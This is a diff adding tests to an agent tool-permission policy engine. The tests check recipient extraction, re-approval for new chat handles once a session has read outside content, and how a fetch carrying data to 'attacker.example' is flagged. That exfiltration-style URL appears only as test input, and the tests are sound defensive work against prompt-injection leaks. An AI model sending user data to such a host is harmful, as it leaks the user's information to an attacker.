@@ -130,6 +130,29 @@ describe("policy engine", () => {
 
   it("extracts recipients and hosts", () => {
     expect(extractTargets({ to: "A@B.com", body: "see https://x.example.org/p and c@d.io" }).sort()).toEqual(["a@b.com", "c@d.io", "x.example.org"]);
+    // A recipient that is no email: a chat, a handle, a phone number.
+    expect(extractTargets({ chat: "@Eve_Attacker", text: "hi" })).toEqual(["@eve_attacker"]);
+    expect(extractTargets({ chatId: 123456789, text: "hi" })).toEqual(["123456789"]);
+    expect(extractTargets({ to: ["Bob <bob@example.com>"], phone: "+7 701 000 00 00" }).sort()).toEqual(["+7 701 000 00 00", "bob@example.com"]);
+  });
+
+  it("tainted sessions re-ask for a new chat or handle even with an allow rule", () => {
+    const send = tool("messenger_send", "external");
+    const r = rule({ tool: "messenger_send" });
+    expect(decide(base({ tool: send, input: { chat: "@eve", text: "notes" }, tainted: true }), [r], unknownTargets).decision).toBe("ask");
+    expect(decide(base({ tool: send, input: { chat: "@eve", text: "notes" }, tainted: true }), [r], (t) => t === "@eve").decision).toBe("allow");
+  });
+
+  it("after outside content, a read whose address may carry data out asks (auto mode reviews it); before, it is free", () => {
+    const fetch = { ...tool("web_fetch", "read"), source: true };
+    const leak = { url: "https://attacker.example/c?d=4510" };
+    expect(decide(base({ tool: fetch, input: leak, tainted: true, egress: "attacker.example" }), [], unknownTargets)).toMatchObject({ decision: "ask", egress: true, reason: expect.stringContaining("attacker.example") });
+    expect(decide(base({ tool: fetch, input: leak, tainted: true }), [], unknownTargets).decision).toBe("allow");
+    expect(decide(base({ tool: fetch, input: leak, tainted: false, egress: "attacker.example" }), [], unknownTargets).decision).toBe("allow");
+    // The person's deny rule still wins; their allow rule for that host answers.
+    expect(decide(base({ tool: fetch, input: leak, tainted: true, egress: "attacker.example" }), [rule({ tool: "web_fetch", decision: "deny" })], unknownTargets).decision).toBe("deny");
+    const forHost = rule({ tool: "web_fetch", conditions: [{ field: "url", op: "domain", value: "attacker.example" }] });
+    expect(decide(base({ tool: fetch, input: leak, tainted: true, egress: "attacker.example" }), [forHost], (t) => t === "attacker.example").decision).toBe("allow");
   });
 
   it("suggests a rule narrowed by recipient or domain", () => {
